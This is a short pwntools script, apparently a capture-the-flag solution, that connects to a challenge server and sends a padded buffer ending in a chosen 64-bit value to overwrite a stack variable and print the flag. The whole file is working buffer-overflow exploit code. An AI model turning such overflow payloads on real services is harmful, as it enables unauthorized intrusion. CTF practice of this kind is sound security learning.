from pwn import *
binary = ELF('./pwn-intended-0x2')
#p = process('./pwn-intended-0x2')
# p.recvline()
#print(p.recvline())
for i in range(44 , 53):
    p = remote('chall.csivit.com', 30007)
    payload = i * b'a'
    payload += p64(eval('-0x35014542'), sign= 'signed')
    # print(payload)
    p.sendline(payload)
    print(p.recvline())
    print(p.recvline())
    print(p.recvline())
    print(p.recvuntil('}'))
    #print(p.recvline())
    #print(p.recvline())

    #p.stream()
    # p.interactive()
    break
    # print(p.recvline())
    try:
        print(p.recvline())
        print(p.recvline())
        
        print(i)
        break
    except:
        continue
